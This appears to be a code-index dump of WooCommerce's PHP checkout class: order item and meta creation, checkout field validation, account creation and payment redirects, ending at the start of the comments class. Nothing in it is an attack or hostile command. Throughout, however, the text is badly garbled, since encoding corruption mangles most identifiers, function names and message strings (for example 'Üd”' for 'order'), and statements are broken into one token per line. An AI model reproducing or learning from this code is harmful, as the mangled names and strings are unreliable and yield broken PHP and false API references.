Ğ'woocomm”û_add_Üd”_™em_m‘a', 
$™em_id
, 
$v®ues
, 
$ÿ¹_™em_key
 );

296 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_ães
(è
as
 
$ãe_key
 => 
$ãe
 ) {

297 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

298 'Üd”_™em_Çme' => 
$ãe
->
Çme
,

302 iàĞ
$ãe
->
xabË
 )

303 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_x_şass', 
$ãe
->
x_şass
 );

305 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_tax_class', '0' );

307 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_tÙ®', 
	`wc_fÜm©_decim®
Ğ
$ãe
->
amouÁ
 ) );

308 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '_lše_x', 
	`wc_fÜm©_decim®
Ğ
$ãe
->
x
 ) );

311 
	`do_aùiÚ
Ğ'woocomm”û_add_Üd”_ãe_m‘a', 
$Üd”_id
, 
$™em_id
, 
$ãe
, 
$ãe_key
 );

315 
$·ckages
 = 
	`WC
()->
shpšg
->
	`g‘_·ckages
();

317 
	`fÜ—ch
 ( 
$·ckages
 
as
 
$i
 => 
$·ckage
 ) {

318 iàĞ
	`is£t
Ğ
$·ckage
['¿‹s'][ 
$this
->
shpšg_m‘hods
[ 
$i
 ] ] ) ) {

320 
$m‘hod
 = 
$·ckage
['¿‹s'][ 
$this
->
shpšg_m‘hods
[ 
$i
 ] ];

322 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

323 'Üd”_™em_Çme' => 
$m‘hod
->
Ïb–
,

327 iàĞ
$™em_id
 ) {

328 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'm‘hod_id', 
$m‘hod
->
id
 );

329 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'co¡', 
	`wc_fÜm©_decim®
Ğ
$m‘hod
->
co¡
 ) );

330 
	`do_aùiÚ
Ğ'woocomm”û_add_shpšg_Üd”_™em', 
$Üd”_id
, 
$™em_id
, 
$i
 );

336 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
	`WC
()->
ÿ¹
->
xes
 + WC()->ÿ¹->
shpšg_xes
 ) 
as
 
$key
 ) {

337 
$code
 = 
	`WC
()->
ÿ¹
->
x
->
	`g‘_¿‹_code
Ğ
$key
 );

339 iàĞ
$code
 ) {

340 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

341 'Üd”_™em_Çme' => 
$code
,

346 iàĞ
$™em_id
 ) {

347 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '¿‹_id', 
$key
 );

348 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'Ïb–', 
	`WC
()->
ÿ¹
->
x
->
	`g‘_¿‹_Ïb–
Ğ
$key
 ) );

349 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'compound', 
	`absšt
Ğ
	`WC
()->
ÿ¹
->
x
->
	`is_compound
Ğ
$key
 ) ? 1 : 0 ) );

350 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'x_amouÁ', 
	`wc_fÜm©_decim®
Ğ
	`is£t
Ğ
	`WC
()->
ÿ¹
->
xes
[ 
$key
 ] ) ? WC()->cart->taxes[ $key ] : 0 ) );

351 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'shpšg_x_amouÁ', 
	`wc_fÜm©_decim®
Ğ
	`is£t
Ğ
	`WC
()->
ÿ¹
->
shpšg_xes
[ 
$key
 ] ) ? WC()->cart->shipping_taxes[ $key ] : 0 ) );

357 iàĞ
$­¶›d_coupÚs
 = 
	`WC
()->
ÿ¹
->
	`g‘_coupÚs
() ) {

358 
	`fÜ—ch
 ( 
$­¶›d_coupÚs
 
as
 
$code
 => 
$coupÚ
 ) {

360 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

361 'Üd”_™em_Çme' => 
$code
,

366 iàĞ
$™em_id
 ) {

367 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'discouÁ_amouÁ', 
	`is£t
Ğ
	`WC
()->
ÿ¹
->
coupÚ_discouÁ_amouÁs
[ 
$code
 ] ) ? WC()->cart->coupon_discount_amounts[ $code ] : 0 );

372 iàĞ
$this
->
·ym’t_m‘hod
 ) {

373 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_·ym’t_m‘hod', 
$this
->
·ym’t_m‘hod
->
id
 );

374 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_·ym’t_m‘hod_t™Ë', 
$this
->
·ym’t_m‘hod
->
	`g‘_t™Ë
() );

376 iàĞ
	`em±y
Ğ
$this
->
po¡ed
['blšg_ema'] ) && 
	`is_u£r_logged_š
() ) {

377 
$cu¼’t_u£r
 = 
	`wp_g‘_cu¼’t_u£r
();

378 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_blšg_ema', 
$cu¼’t_u£r
->
u£r_ema
 );

380 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_Üd”_shpšg', 
	`wc_fÜm©_decim®
Ğ
	`WC
()->
ÿ¹
->
shpšg_tÙ®
 ) );

381 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_Üd”_discouÁ', 
	`wc_fÜm©_decim®
Ğ
	`WC
()->
ÿ¹
->
	`g‘_Üd”_discouÁ_tÙ®
() ) );

382 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_ÿ¹_discouÁ', 
	`wc_fÜm©_decim®
Ğ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹_discouÁ_tÙ®
() ) );

383 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_Üd”_x', 
	`wc_fÜm©_decim®
Ğ
	`WC
()->
ÿ¹
->
x_tÙ®
 ) );

384 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_Üd”_shpšg_x', 
	`wc_fÜm©_decim®
Ğ
	`WC
()->
ÿ¹
->
shpšg_x_tÙ®
 ) );

385 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_Üd”_tÙ®', 
	`wc_fÜm©_decim®
Ğ
	`WC
()->
ÿ¹
->
tÙ®
, 
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) ) );

387 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_Üd”_key', 'wc_' . 
	`­¶y_f‹rs
('woocomm”û_g’”©e_Üd”_key', 
	`uniqid
('order_') ) );

388 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_cu¡om”_u£r', 
	`absšt
Ğ
$this
->
cu¡om”_id
 ) );

389 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_Üd”_cu¼’cy', 
	`g‘_woocomm”û_cu¼’cy
() );

390 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_´iûs_šşude_x', 
	`g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) );

391 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_cu¡om”__add»ss', 
	`is£t
Ğ
$_SERVER
['HTTP_X_FORWARDED_FOR'] ) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'] );

392 
	`upd©e_po¡_m‘a
Ğ
$Üd”_id
, '_cu¡om”_u£r_ag’t', 
	`is£t
Ğ
$_SERVER
['HTTP_USER_AGENT'] ) ? $_SERVER['HTTP_USER_AGENT'] : '' );

395 
	`do_aùiÚ
Ğ'woocomm”û_checkout_upd©e_Üd”_m‘a', 
$Üd”_id
, 
$this
->
po¡ed
 );

398 
	`wp_£t_objeù_‹rms
Ğ
$Üd”_id
, 'pending', 'shop_order_status' );

400  
$Üd”_id
;

401 
	}
}

409 
public
 
funùiÚ
 
	$´oûss_checkout
() {

410 
glob®
 
$wpdb
, 
$cu¼’t_u£r
;

412 
	`wp_v”ify_nÚû
Ğ
$_POST
['_wpnonce'], 'woocommerce-process_checkout' );

414 iàĞ! 
	`defšed
( 'WOOCOMMERCE_CHECKOUT' ) )

415 
	`defše
Ğ'WOOCOMMERCE_CHECKOUT', 
Œue
 );

418 @
	`£t_time_lim™
(0);

420 
	`do_aùiÚ
( 'woocommerce_before_checkout_process' );

422 iàĞĞ
	`WC
()->
ÿ¹
->
	`g‘_ÿ¹
() ) == 0 )

423 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'SÜry, you¸£ssiÚ ha expœed. <¨h»f="%s" cÏss="wc-backw¬d">R‘uºØhom•age</a>', 'woocomm”û' ), 
	`home_u¾
() ), 'error' );

425 
	`do_aùiÚ
( 'woocommerce_checkout_process' );

428 
$this
->
po¡ed
['‹rms'] = 
	`is£t
Ğ
$_POST
['terms'] ) ? 1 : 0;

429 
$this
->
po¡ed
['ü—‹accouÁ'] = 
	`is£t
Ğ
$_POST
['createaccount'] ) ? 1 : 0;

430 
$this
->
po¡ed
['·ym’t_m‘hod'] = 
	`is£t
Ğ
$_POST
['·ym’t_m‘hod'] ) ? 
	`¡r¦ashes
( $_POST['payment_method'] ) : '';

431 
$this
->
po¡ed
['shpšg_m‘hod'] = 
	`is£t
Ğ
$_POST
['shipping_method'] ) ? $_POST['shipping_method'] : '';

432 
$this
->
po¡ed
['sh_to_difã»Á_add»ss'] = 
	`is£t
Ğ
$_POST
['sh_to_difã»Á_add»ss'] ) ? 
Œue
 : 
çl£
;

434 iàĞ
	`is£t
Ğ
$_POST
['shiptobilling'] ) ) {

435 
	`_d•»ÿ‹d_¬gum’t
( 'WC_Checkout::process_checkout()', '2.1', 'The "shiptobilling" field is deprecated. THeemplate files‡re out of date' );

437 
$this
->
po¡ed
['sh_to_difã»Á_add»ss'] = 
$_POST
['shtoblšg'] ? 
çl£
 : 
Œue
;

441 iàĞ
	`WC
()->
ÿ¹
->
	`sh_to_blšg_add»ss_Úly
() )

442 
$this
->
po¡ed
['sh_to_difã»Á_add»ss'] = 
çl£
;

445 
$cho£n_shpšg_m‘hods
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'chosen_shipping_methods' );

447 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['shpšg_m‘hod'] ) && 
	`is_¬¿y
( $this->posted['shipping_method'] ) )

448 
	`fÜ—ch
 ( 
$this
->
po¡ed
['shpšg_m‘hod'] 
as
 
$i
 => 
$v®ue
 )

449 
$cho£n_shpšg_m‘hods
[ 
$i
 ] = 
	`wc_ş—n
Ğ
$v®ue
 );

451 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'cho£n_shpšg_m‘hods', 
$cho£n_shpšg_m‘hods
 );

452 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'cho£n_·ym’t_m‘hod', 
$this
->
po¡ed
['payment_method'] );

455 
$sk³d_shpšg
 = 
çl£
;

458 
	`fÜ—ch
 ( 
$this
->
checkout_f›lds
 
as
 
$f›ld£t_key
 => 
$f›ld£t
 ) {

461 iàĞ
$f›ld£t_key
 =ğ'shpšg' && ( 
$this
->
po¡ed
['sh_to_difã»Á_add»ss'] =ğ
çl£
 || ! 
	`WC
()->
ÿ¹
->
	`Ãeds_shpšg
() ) ) {

462 
$sk³d_shpšg
 = 
Œue
;

467 iàĞ
$f›ld£t_key
 =ğ'accouÁ' && ( 
	`is_u£r_logged_š
(è|| ( 
$this
->
mu¡_ü—‹_accouÁ
 =ğ
çl£
 && 
	`em±y
Ğ$this->
po¡ed
['createaccount'] ) ) ) ) {

471 
	`fÜ—ch
 ( 
$f›ld£t
 
as
 
$key
 => 
$f›ld
 ) {

473 iàĞ! 
	`is£t
Ğ
$f›ld
['type'] ) )

474 
$f›ld
['type'] = 'text';

477  
$f›ld
['type'] ) {

479 
$this
->
po¡ed
[ 
$key
 ] = 
	`is£t
Ğ
$_POST
[ $key ] ) ? 1 : 0;

482 
$this
->
po¡ed
[ 
$key
 ] = 
	`is£t
Ğ
$_POST
[ $key ] ) ? 
	`im¶ode
Ğ', ', 
	`¬¿y_m­
( 'wc_clean', $_POST[ $key ] ) ) : '';

485 
$this
->
po¡ed
[ 
$key
 ] = 
	`is£t
Ğ
$_POST
[ $key ] ) ? 
	`wp_¡r_®l_gs
Ğ
	`wp_check_šv®id_utf8
Ğ
	`¡r¦ashes
( $_POST[ $key ] ) ) ) : '';

488 
$this
->
po¡ed
[ 
$key
 ] = 
	`is£t
Ğ
$_POST
[ $key ] ) ? 
	`wc_ş—n
( $_POST[ $key ] ) : '';

493 
$this
->
po¡ed
[ 
$key
 ] = 
	`­¶y_f‹rs
Ğ'woocomm”û_´oûss_checkout_' . 
	`§n™ize_t™Ë
Ğ
$f›ld
['type'] ) . '_field', $this->posted[ $key ] );

494 
$this
->
po¡ed
[ 
$key
 ] = 
	`­¶y_f‹rs
( 'woocommerce_process_checkout_field_' . $key, $this->posted[ $key ] );

497 iàĞ
	`is£t
Ğ
$f›ld
['»quœed'] ) && $f›ld['»quœed'] && 
	`em±y
Ğ
$this
->
po¡ed
[ 
$key
 ] ) )

498 
	`wc_add_nÙiû
Ğ'<¡rÚg>' . 
$f›ld
['Ïb–'] . '</¡rÚg> ' . 
	`__
( 'is‡„equired field.', 'woocommerce' ), 'error' );

500 iàĞ! 
	`em±y
Ğ
$this
->
po¡ed
[ 
$key
 ] ) ) {

503 iàĞ! 
	`em±y
Ğ
$f›ld
['v®id©e'] ) && 
	`is_¬¿y
( $field['validate'] ) ) {

504 
	`fÜ—ch
 ( 
$f›ld
['v®id©e'] 
as
 
$ruË
 ) {

505  
$ruË
 ) {

507 
$this
->
po¡ed
[ 
$key
 ] = 
	`¡¹ouµ”
Ğ
	`¡r_»¶aû
( ' ', '', $this->posted[ $key ] ) );

509 iàĞ! 
WC_V®id©iÚ
::
	`is_po¡code
Ğ
$this
->
po¡ed
[ 
$key
 ], 
$_POST
[ 
$f›ld£t_key
 . '_country' ] ) ) :

510 
	`wc_add_nÙiû
Ğ
	`__
( 'Pleaseƒnter‡ valid…ostcode/ZIP.', 'woocommerce' ), 'error' );

512 
$this
->
po¡ed
[ 
$key
 ] = 
	`wc_fÜm©_po¡code
Ğ$this->po¡ed[ $key ], 
$_POST
[ 
$f›ld£t_key
 . '_country' ] );

513 
’dif
;

516 
$this
->
po¡ed
[ 
$key
 ] = 
	`wc_fÜm©_phÚe_numb”
( $this->posted[ $key ] );

518 iàĞ! 
WC_V®id©iÚ
::
	`is_phÚe
Ğ
$this
->
po¡ed
[ 
$key
 ] ) )

519 
	`wc_add_nÙiû
Ğ'<¡rÚg>' . 
$f›ld
['Ïb–'] . '</¡rÚg> ' . 
	`__
( 'is‚ot‡ valid…hone‚umber.', 'woocommerce' ), 'error' );

522 
$this
->
po¡ed
[ 
$key
 ] = 
	`¡¹Şow”
( $this->posted[ $key ] );

524 iàĞ! 
	`is_ema
Ğ
$this
->
po¡ed
[ 
$key
 ] ) )

525 
	`wc_add_nÙiû
Ğ'<¡rÚg>' . 
$f›ld
['Ïb–'] . '</¡rÚg> ' . 
	`__
( 'is‚ot‡ validƒmail‡ddress.', 'woocommerce' ), 'error' );

529 
$v®id_¡©es
 = 
	`WC
()->
couÁr›s
->
	`g‘_¡©es
Ğ
$_POST
[ 
$f›ld£t_key
 . '_country' ] );

530 iàĞ
$v®id_¡©es
 )

531 
$v®id_¡©e_v®ues
 = 
	`¬¿y_æ
Ğ
	`¬¿y_m­
Ğ'¡¹Şow”', 
$v®id_¡©es
 ) );

534 iàĞ
	`is£t
Ğ
$v®id_¡©e_v®ues
[ 
	`¡¹Şow”
Ğ
$this
->
po¡ed
[ 
$key
 ] ) ] ) )

535 
$this
->
po¡ed
[ 
$key
 ] = 
$v®id_¡©e_v®ues
[ 
	`¡¹Şow”
( $this->posted[ $key ] ) ];

538 iàĞ
$v®id_¡©es
 && ( $valid_states ) > 0 )

539 iàĞ! 
	`š_¬¿y
Ğ
$this
->
po¡ed
[ 
$key
 ], 
	`¬¿y_keys
Ğ
$v®id_¡©es
 ) ) )

540 
	`wc_add_nÙiû
Ğ'<¡rÚg>' . 
$f›ld
['Ïb–'] . '</¡rÚg> ' . 
	`__
Ğ'i nÙ v®id. PËa£ƒÁ” oÃ oàthfŞlowšg:', 'woocomm”û' ) . ' ' . 
	`im¶ode
Ğ', ', 
$v®id_¡©es
 ), 'error' );

550 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['billing_country'] ) )

551 
	`WC
()->
cu¡om”
->
	`£t_couÁry
Ğ
$this
->
po¡ed
['billing_country'] );

552 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['billing_state'] ) )

553 
	`WC
()->
cu¡om”
->
	`£t_¡©e
Ğ
$this
->
po¡ed
['billing_state'] );

554 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['billing_postcode'] ) )

555 
	`WC
()->
cu¡om”
->
	`£t_po¡code
Ğ
$this
->
po¡ed
['billing_postcode'] );

558 iàĞ! 
$sk³d_shpšg
 ) {

561 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['shipping_country'] ) )

562 
	`WC
()->
cu¡om”
->
	`£t_shpšg_couÁry
Ğ
$this
->
po¡ed
['shipping_country'] );

563 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['shipping_state'] ) )

564 
	`WC
()->
cu¡om”
->
	`£t_shpšg_¡©e
Ğ
$this
->
po¡ed
['shipping_state'] );

565 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['shipping_postcode'] ) )

566 
	`WC
()->
cu¡om”
->
	`£t_shpšg_po¡code
Ğ
$this
->
po¡ed
['shipping_postcode'] );

571 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['billing_country'] ) )

572 
	`WC
()->
cu¡om”
->
	`£t_shpšg_couÁry
Ğ
$this
->
po¡ed
['billing_country'] );

573 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['billing_state'] ) )

574 
	`WC
()->
cu¡om”
->
	`£t_shpšg_¡©e
Ğ
$this
->
po¡ed
['billing_state'] );

575 iàĞ
	`is£t
Ğ
$this
->
po¡ed
['billing_postcode'] ) )

576 
	`WC
()->
cu¡om”
->
	`£t_shpšg_po¡code
Ğ
$this
->
po¡ed
['billing_postcode'] );

581 
	`WC
()->
ÿ¹
->
	`ÿlcuÏ‹_tÙ®s
();

584 iàĞ! 
	`is£t
Ğ
$_POST
['woocomm”û_checkout_upd©e_tÙ®s'] ) && 
	`em±y
Ğ
$this
->
po¡ed
['‹rms'] ) && 
	`wc_g‘_·ge_id
( 'terms' ) > 0 )

585 
	`wc_add_nÙiû
Ğ
	`__
( 'You must‡ccept our Terms &amp; Conditions.', 'woocommerce' ), 'error' );

587 iàĞ
	`WC
()->
ÿ¹
->
	`Ãeds_shpšg
() ) {

589 iàĞ! 
	`š_¬¿y
Ğ
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
(), 
	`¬¿y_keys
ĞWC()->
couÁr›s
->
	`g‘_shpšg_couÁr›s
() ) ) )

590 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'UnfÜtuÇ‹ly <¡rÚg>wdØnÙ shØ%s</¡rÚg>. PËa£ƒÁ”‡À®‹º©ivshpšg‡dd»ss.', 'woocomm”û' ), 
	`WC
()->
couÁr›s
->
	`shpšg_to_´efix
(è. ' ' . WC()->
cu¡om”
->
	`g‘_shpšg_couÁry
() ), 'error' );

593 
$·ckages
 = 
	`WC
()->
shpšg
->
	`g‘_·ckages
();

594 
$this
->
shpšg_m‘hods
 = 
	`WC
()->
£ssiÚ
->
	`g‘
( 'chosen_shipping_methods' );

596 
	`fÜ—ch
 ( 
$·ckages
 
as
 
$i
 => 
$·ckage
 ) {

597 iàĞ! 
	`is£t
Ğ
$·ckage
['¿‹s'][ 
$this
->
shpšg_m‘hods
[ 
$i
 ] ] ) ) {

598 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid shipping method.', 'woocommerce' ), 'error' );

599 
$this
->
shpšg_m‘hods
[ 
$i
 ] = '';

604 iàĞ
	`WC
()->
ÿ¹
->
	`Ãeds_·ym’t
() ) {

607 
$avaabË_g©eways
 = 
	`WC
()->
·ym’t_g©eways
->
	`g‘_avaabË_·ym’t_g©eways
();

609 iàĞ! 
	`is£t
Ğ
$avaabË_g©eways
[ 
$this
->
po¡ed
['payment_method'] ] ) ) {

610 
$this
->
·ym’t_m‘hod
 = '';

611 
	`wc_add_nÙiû
Ğ
	`__
( 'Invalid…ayment method.', 'woocommerce' ), 'error' );

613 
$this
->
·ym’t_m‘hod
 = 
$avaabË_g©eways
[ $this->
po¡ed
['payment_method'] ];

614 
$this
->
·ym’t_m‘hod
->
	`v®id©e_f›lds
();

619 
	`do_aùiÚ
Ğ'woocomm”û_aá”_checkout_v®id©iÚ', 
$this
->
po¡ed
 );

621 iàĞ! 
	`is£t
Ğ
$_POST
['woocomm”û_checkout_upd©e_tÙ®s'] ) && 
	`wc_nÙiû_couÁ
( 'error' ) == 0 ) {

623 
Œy
 {

626 
$this
->
cu¡om”_id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_cu¡om”_id', 
	`g‘_cu¼’t_u£r_id
() );

628 iàĞ! 
	`is_u£r_logged_š
(è&& ( 
$this
->
mu¡_ü—‹_accouÁ
 || ! 
	`em±y
Ğ$this->
po¡ed
['createaccount'] ) ) ) {

630 
$u£ºame
 = ! 
	`em±y
Ğ
$this
->
po¡ed
['account_username'] ) ? $this->posted['account_username'] : '';

631 
$·sswÜd
 = ! 
	`em±y
Ğ
$this
->
po¡ed
['account_password'] ) ? $this->posted['account_password'] : '';

632 
$Ãw_cu¡om”
 = 
	`wc_ü—‹_Ãw_cu¡om”
Ğ
$this
->
po¡ed
['blšg_ema'], 
$u£ºame
, 
$·sswÜd
 );

634 iàĞ
	`is_wp_”rÜ
Ğ
$Ãw_cu¡om”
 ) )

635 
throw
 
Ãw
 
	`Exû±iÚ
Ğ
$Ãw_cu¡om”
->
	`g‘_”rÜ_mes§ge
() );

637 
$this
->
cu¡om”_id
 = 
$Ãw_cu¡om”
;

639 
	`wc_£t_cu¡om”_auth_cook›
Ğ
$this
->
cu¡om”_id
 );

642 
	`WC
()->
£ssiÚ
->
	`£t
Ğ'»lßd_checkout', 
Œue
 );

645 iàĞ
$this
->
po¡ed
['blšg_fœ¡_Çme'] && 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_upd©e_cu¡om”_d©a', 
Œue
, $this ) ) {

646 
$u£rd©a
 = 
	`¬¿y
(

647 'ID' => 
$this
->
cu¡om”_id
,

648 'fœ¡_Çme' => 
$this
->
po¡ed
['billing_first_name'] ? $this->posted['billing_first_name'] : '',

649 'Ï¡_Çme' => 
$this
->
po¡ed
['billing_last_name'] ? $this->posted['billing_last_name'] : '',

650 'di¥Ïy_Çme' => 
$this
->
po¡ed
['billing_first_name'] ? $this->posted['billing_first_name'] : ''

652 
	`wp_upd©e_u£r
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_cu¡om”_u£rd©a', 
$u£rd©a
, 
$this
 ) );

657 
$this
->
	`check_ÿ¹_™ems
();

660 iàĞ
	`wc_nÙiû_couÁ
( 'error' ) > 0 )

661 
throw
 
Ãw
 
	`Exû±iÚ
();

663 
$Üd”_id
 = 
$this
->
	`ü—‹_Üd”
();

665 
	`do_aùiÚ
Ğ'woocomm”û_checkout_Üd”_´oûs£d', 
$Üd”_id
, 
$this
->
po¡ed
 );

668 iàĞ
	`WC
()->
ÿ¹
->
	`Ãeds_·ym’t
() ) {

671 
	`WC
()->
£ssiÚ
->
Üd”_awa™šg_·ym’t
 = 
$Üd”_id
;

674 
$»suÉ
 = 
$avaabË_g©eways
[ 
$this
->
po¡ed
['·ym’t_m‘hod'] ]->
	`´oûss_·ym’t
Ğ
$Üd”_id
 );

677 iàĞ
$»suÉ
['result'] == 'success' ) {

679 
$»suÉ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_·ym’t_sucûssful_»suÉ', $»suÉ, 
$Üd”_id
 );

681 iàĞ
	`is_ajax
() ) {

682 
echo
 '<!--WC_START-->' . 
	`jsÚ_’code
Ğ
$»suÉ
 ) . '<!--WC_END-->';

683 
ex™
;

685 
	`wp_»dœeù
Ğ
$»suÉ
['redirect'] );

686 
ex™
;

693 iàĞ
	`em±y
Ğ
$Üd”
 ) )

694 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$Üd”_id
 );

697 
$Üd”
->
	`·ym’t_com¶‘e
();

700 
	`WC
()->
ÿ¹
->
	`em±y_ÿ¹
();

703 
$»tuº_u¾
 = 
$Üd”
->
	`g‘_checkout_Üd”_»ûived_u¾
();

706 iàĞ
	`is_ajax
() ) {

707 
echo
 '<!--WC_START-->' . 
	`jsÚ_’code
(

708 
	`¬¿y
(

710 '»dœeù' => 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_no_·ym’t_Ãeded_»dœeù', 
$»tuº_u¾
, 
$Üd”
 )

713 
ex™
;

715 
	`wp_§ã_»dœeù
(

716 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_no_·ym’t_Ãeded_»dœeù', 
$»tuº_u¾
, 
$Üd”
 )

718 
ex™
;

723 } 
	`ÿtch
 ( 
Exû±iÚ
 
$e
 ) {

725 iàĞ! 
	`em±y
Ğ
$e
 ) )

726 
	`wc_add_nÙiû
Ğ
$e
->
	`g‘Mes§ge
(), 'error' );

733 iàĞ
	`is_ajax
() ) {

735 
	`ob_¡¬t
();

736 
	`wc_´št_nÙiûs
();

737 
$mes§ges
 = 
	`ob_g‘_ş—n
();

739 
echo
 '<!--WC_START-->' . 
	`jsÚ_’code
(

740 
	`¬¿y
(

742 'mes§ges' => 
$mes§ges
,

743 '»äesh' => 
	`is£t
Ğ
	`WC
()->
£ssiÚ
->
»äesh_tÙ®s
 ) ? 'true' : 'false',

744 '»lßd' => 
	`is£t
Ğ
	`WC
()->
£ssiÚ
->
»lßd_checkout
 ) ? 'true' : 'false'

748 
	`un£t
Ğ
	`WC
()->
£ssiÚ
->
»äesh_tÙ®s
, WC()->£ssiÚ->
»lßd_checkout
 );

749 
ex™
;

751 
	}
}

761 
public
 
funùiÚ
 
	$g‘_v®ue
Ğ
$šput
 ) {

762 iàĞ! 
	`em±y
Ğ
$_POST
[ 
$šput
 ] ) ) {

764  
	`wc_ş—n
Ğ
$_POST
[ 
$šput
 ] );

768 
$v®ue
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_checkout_g‘_v®ue', 
nuÎ
, 
$šput
 );

770 iàĞ
$v®ue
 !=ğ
nuÎ
 )

771  
$v®ue
;

773 iàĞ
	`is_u£r_logged_š
() ) {

775 
$cu¼’t_u£r
 = 
	`wp_g‘_cu¼’t_u£r
();

777 iàĞ
$m‘a
 = 
	`g‘_u£r_m‘a
Ğ
$cu¼’t_u£r
->
ID
, 
$šput
, 
Œue
 ) )

778  
$m‘a
;

780 iàĞ
$šput
 == "billing_email" )

781  
$cu¼’t_u£r
->
u£r_ema
;

784  
$šput
 ) {

786  
	`­¶y_f‹rs
Ğ'deçuÉ_checkout_couÁry', 
	`WC
()->
cu¡om”
->
	`g‘_couÁry
(è? WC()->cu¡om”->g‘_couÁry(è: WC()->
couÁr›s
->
	`g‘_ba£_couÁry
(), 'billing' );

788  
	`­¶y_f‹rs
Ğ'deçuÉ_checkout_¡©e', 
	`WC
()->
cu¡om”
->
	`has_ÿlcuÏ‹d_shpšg
(è? WC()->cu¡om”->
	`g‘_¡©e
() : '', 'billing' );

790  
	`­¶y_f‹rs
Ğ'deçuÉ_checkout_po¡code', 
	`WC
()->
cu¡om”
->
	`g‘_po¡code
() ? WC()->customer->get_postcode() : '', 'billing' );

792  
	`­¶y_f‹rs
Ğ'deçuÉ_checkout_couÁry', 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
(è? WC()->cu¡om”->g‘_shpšg_couÁry(è: WC()->
couÁr›s
->
	`g‘_ba£_couÁry
(), 'shipping' );

794  
	`­¶y_f‹rs
Ğ'deçuÉ_checkout_¡©e', 
	`WC
()->
cu¡om”
->
	`has_ÿlcuÏ‹d_shpšg
(è? WC()->cu¡om”->
	`g‘_shpšg_¡©e
() : '', 'shipping' );

796  
	`­¶y_f‹rs
Ğ'deçuÉ_checkout_po¡code', 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_po¡code
() ? WC()->customer->get_shipping_postcode() : '', 'shipping' );

798  
	`­¶y_f‹rs
Ğ'deçuÉ_checkout_' . 
$šput
, 
nuÎ
, $input );

801 
	}
}

	@includes/class-wc-comments.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 şas 
	cWC_Comm’ts
 {

21 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

23 
	`add_f‹r
Ğ'´•roûss_comm’t', 
	`¬¿y
Ğ
$this
, 'check_comment_rating' ), 0 );

24 
	`add_aùiÚ
Ğ'comm’t_po¡', 
	`¬¿y
Ğ
$this
, 'add_comment_rating' ), 1 );

27 
	`add_aùiÚ
Ğ'wp_£t_comm’t_¡©us', 
	`¬¿y
Ğ
$this
, 'clear_transients' ) );

28 
	`add_aùiÚ
Ğ'ed™_comm’t', 
	`¬¿y
Ğ
$this
, 'clear_transients' ) );

31 
	`add_f‹r
Ğ'comm’ts_şau£s', 
	`¬¿y
Ğ
__CLASS__
, 'exclude_order_comments' ), 10, 1 );

32 
	`add_aùiÚ
Ğ'comm’t_ãed_još', 
	`¬¿y
Ğ
$this
